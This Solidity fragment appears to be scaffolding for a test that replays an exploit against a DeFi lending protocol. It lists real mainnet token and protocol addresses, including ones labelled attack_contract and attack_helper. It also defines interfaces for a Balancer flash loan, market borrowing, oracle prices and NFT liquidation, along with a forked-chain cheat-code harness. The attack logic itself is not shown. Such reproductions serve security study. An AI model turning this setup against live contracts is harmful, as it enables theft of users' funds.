    address internal constant A_9430C7_91B2 = 0x9430C785F4e22B4c0a68EA019828a68D5FeF91B2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant XCN = 0xA2cd3D43c775978A96BdBf12d733D5A1ED94fb18;
    address internal constant attack_contract = 0xa57eDA20Be51Ae07Df3c8B92494C974a92cf8956;
    address internal constant A_AD4581_A248 = 0xAD45812C62fcBC8D54d0CC82773e85A11f19A248;
    address internal constant attack_helper = 0xAE7d68b140Ed075E382e0A01d6c67ac675AFa223;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant oXCN = 0xBD20ae088deE315ace2C08Add700775F461fEa64;
    address internal constant A_BF4401_6E11 = 0xbF4401a50E595526Df10a2afA6e75455a7E66E11;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant Unitroller = 0xcC53F8fF403824a350885A345ED4dA649e060369;
    address internal constant A_D3248F_6D3F = 0xd3248FB879b3B5CE16f538D10E00169db0eE6D3f;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant oVUSD = 0xeE894c051c402301bC19bE46c231D2a8E38b0451;
    address internal constant oDAI = 0xF3354d3e288CE599988e23f9ad814Ec1b004d74a;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IChainlinkOracle {
    function getUnderlyingPrice(address) external view returns (uint256);
}

interface INFTLiquidationProxy {
    function liquidateWithSingleRepay(address, address, address, uint256) external;
}

interface ISwapRouter {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external;
    function getAccountLiquidity(address) external;
    function oracle() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IoBTC {
    function borrow(uint256) external returns (uint256);
    function getCash() external returns (uint256);
    function underlying() external returns (uint256);
}

interface IoDAI {
    function borrow(uint256) external returns (uint256);
    function getCash() external returns (uint256);
    function underlying() external returns (uint256);
}

interface IoETH {
    function borrow(uint256) external returns (uint256);
    function exchangeRateStored() external returns (uint256);
    function getCash() external returns (uint256);
    function mint() external payable;
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IoUSDT {
    function borrow(uint256) external returns (uint256);
    function getCash() external returns (uint256);
    function underlying() external returns (uint256);
}

interface IoVUSD {
    function borrow(uint256) external returns (uint256);
}

interface IoXCN {
    function borrow(uint256) external returns (uint256);
    function getCash() external returns (uint256);
    function underlying() external returns (uint256);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
